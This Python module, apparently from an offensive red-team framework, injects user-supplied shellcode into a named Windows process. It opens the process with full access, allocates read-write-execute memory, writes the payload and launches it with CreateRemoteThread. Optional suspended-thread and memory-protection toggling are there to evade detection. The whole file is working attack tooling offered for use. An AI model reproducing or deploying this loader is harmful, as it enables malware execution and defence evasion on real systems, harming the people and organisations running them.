########################################################
### Injection Module
### Status: migrated 084
### 
########################################################

import os
from utils.windef import *
from utils.winconst import *
from utils.helper import nstate
from utils.helper import CheckFile, GetFileInfo

CATEGORY    = 'inject'
DESCRIPTION = 'Inject shellcode into memory with CreateRemoteThread'

arglist = {
    'input':           { 'value': None, 'desc': 'Input file or buffer for process injection' },
    'process':         { 'value': None, 'desc': 'Processname to inject the shellcode' },
    'start_process':   { 'value': False, 'desc': 'If not active, start the process before injection' },
    'shellcode':       { 'value': None, 'desc': 'Internal use only, don\'t change!' },
    'resume_thread':   { 'value': False, 'desc': 'Start thread suspended and resume after speciefied time' },
    'virtual_protect': { 'value': False, 'desc': 'Deny access on memory for a specified time' }
}

def register_arguments(parser):
            parser.add_argument('-i', '--input', help=arglist['input']['desc'])
            parser.add_argument('-p', '--process', help=arglist['process']['desc'])

            grp = parser.add_argument_group('additional')
            grp.add_argument('-r', '--resume-thread', action='store_true', help=arglist['resume_thread']['desc'])
            grp.add_argument('-s', '--start-process', action='store_true', help=arglist['start_process']['desc'])
            grp.add_argument('-v', '--virtual-protect', action='store_true', help=arglist['virtual_protect']['desc'])

class module:
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'cpu0x00, psycore8'
    Version = '2.1.7'
    DisplayName = 'INJECTION'
    delay = 5
    data_size = 0
    hash = ''
    pid = int
    relay = False
    shell_path = '::inject::injection'

    def __init__(self, input, process, start_process, shellcode=None, resume_thread=None, virtual_protect=None):
    #def __init__(self, **arglist):
        self.input = input
        self.process_start = start_process
        self.target_process = process
        self.shellcode = shellcode
        self.resume_thread = resume_thread
        self.virtual_protect = virtual_protect

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'       : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'error.input'    : f'{nstate.s_fail} File {self.input} not found or cannot be opened.',    
            'post.done'      : f'{nstate.s_ok} DONE!',
            'proc.input_ok'  : f'{nstate.s_ok} File {self.input} loaded\n{nstate.s_ok} Size of shellcode {self.data_size} bytes\n{nstate.s_ok} Hash: {self.hash}',
            'proc.input_try' : f'{nstate.s_note} Try to open file {self.input}',
            'proc.try'       : f'{nstate.s_note} Try to execute shellcode',
            'inj.run'        : f'{nstate.s_note} starting {self.target_process}',
            'inj.pid'        : f'{nstate.s_note} {self.target_process} process id: {self.pid}',
            'inj.handle'     : f'{nstate.s_note} Opened a Handle to the process',
            'inj.alloc'      : f'{nstate.s_note} Allocated Memory in the process',
            'inj.write'      : f'{nstate.s_ok} Wrote The shellcode to memory',
            'inj.nacc'       : f'{nstate.s_note} VirtualProtectEx: PAGE_NO_ACCESS',
            'inj.susp'       : f'{nstate.s_note} CreateRemoteThread: START_SUSPENDED',
            'inj.inj_ok'     : f'{nstate.s_ok} Injected the shellcode into the process',
            'inj.rwe'        : f'{nstate.s_note} VirtualProtectEx: PAGE_READWRITE_EXECUTE',
            'inj.rest'       : f'{nstate.s_note} ResumeThread',
            'inj.resume'     : f'{nstate.s_ok} Process resumed'

        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def Start_Process(self):
        self.msg('inj.run')
        os.system(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        self.pid = processes[0].ProcessId
        self.msg('inj.pid')
        return int(self.pid)

    def start_injection(self):
        if self.process_start:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)

        process_id = self.get_proc_id()
        
        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            self.msg('inj.handle')

        memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory:
            self.msg('inj.alloc')

        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), 0)
        if writing:
            self.msg('inj.write')
        if self.virtual_protect:
            self.msg('inj.nacc')
            VirtualProtectEx(phandle, None, 0, 0x01, None)

        if self.resume_thread or self.virtual_protect:
            self.msg('inj.susp')
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
        else:
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

        if Injection:
            self.msg('inj.inj_ok')

        if self.virtual_protect:
            self.msg('inj.rwe')
            VirtualProtectEx(phandle, None, 0, 0x40, None)

        if self.resume_thread or self.virtual_protect:
            self.sleep(self.delay)
            self.msg('inj.rest')
            resume = ResumeThread(Injection)
            if resume:
                self.msg('inj.resume')

        CloseHandle(phandle)

    def proc_inject():
        return False
    
    def open_file(self):
        try:
            with open(self.input, 'rb') as file:
                self.shellcode = file.read()
        except FileNotFoundError:
            return False
    
    def process(self):
        self.msg('pre.head')
        if isinstance(self.input, str):
            self.msg('proc.input_try')
            CheckFile(self.input)
            self.data_size, self.hash = GetFileInfo(self.input)
            self.msg('proc.input_ok')
            self.open_file()
            self.msg('proc.try')
            self.start_injection()
        elif isinstance(self.input, bytes):
            self.shellcode = self.input
            self.start_injection()
        else:
            self.msg('error.input', True)
        self.msg('post.done')